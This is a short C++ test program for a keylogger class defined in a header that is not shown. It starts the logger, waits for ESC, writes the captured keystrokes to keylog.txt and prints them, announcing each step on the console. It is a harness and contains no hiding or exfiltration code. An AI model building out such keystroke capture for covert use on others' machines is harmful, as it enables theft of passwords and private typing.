#include "Keylogger.h"
#include <iostream>
#include <chrono>
#include <thread>

int main()
{
    std::cout << "=== Keylogger Test ===\n\n";

    auto& kl = Keylogger::get();
    kl.start();
    std::cout << "Keylogger started.\n";
    std::cout << "Press ESC to stop...\n";

    while (true) {
        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
            std::cout << "\nESC pressed.\n";
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    kl.stop();
    std::cout << "Keylogger stopped.\n";

    kl.flushBuffer(L"keylog.txt");  // Ghi buffer ra file + clear buffer

    std::wcout << L"\n--- Log Content ---\n" << kl.getLog() << L"\n";

    std::cout << "\nPress any key to exit...";
    std::cin.get();

    return 0;
}
